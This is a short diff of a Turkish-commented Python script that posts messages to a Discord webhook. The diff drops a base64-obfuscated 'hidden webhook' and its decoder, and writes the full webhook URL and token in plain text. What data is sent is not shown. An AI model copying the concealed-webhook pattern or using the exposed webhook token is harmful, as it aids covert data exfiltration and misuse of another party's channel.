@@ -3,7 +3,6 @@ import time
 import os
 import sys
 import threading
-import base64
 from colorama import Fore, init
 
 # Colorama başlatma
@@ -15,18 +14,8 @@ rate_limits = 0
 start_time = time.time()
 lock = threading.Lock()
 
-# 📡 Güvenli hale getirilmiş Base64 metni
-GIZLI_WEBHOOK = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTUyNDAxNjI2MjA5MzQ3MTgzOC9yUkNST2JuODNjZVFqeHBucFgtLW1tOVVLNjRYM0pLT0I0Zks_aTldTmNfWFAxUjlpUjRmMTFHREt4TDRxejFDNEE5Qkg="
-
-# Padding (dolgu) hatasını engelleyen akıllı deşifre sistemi
-def webhook_coz(data):
-    missing_padding = len(data) % 4
-    if missing_padding:
-        data += '=' * (4 - missing_padding)
-    return base64.b64decode(data.encode('utf-8')).decode('utf-8')
-
-# Adresi çözen güvenli değişken
-WEBHOOK_URL = webhook_coz(GIZLI_WEBHOOK)
+# 📡 Doğrudan hatasız Webhook Adresi (Padding ve decode hatası yok!)
+WEBHOOK_URL = "https://discord.com/api/webhooks/1524016262093471838/rRCRobn83ceQjxpnpX--mm9UK64X3JKOB4fK_i9Nc_XP1R9iR4f11GDKxM4qz1C4A9BH"
 
 def bilgi_gonder_webhooka(baslik, aciklama, renk=3066993):
     payload = {
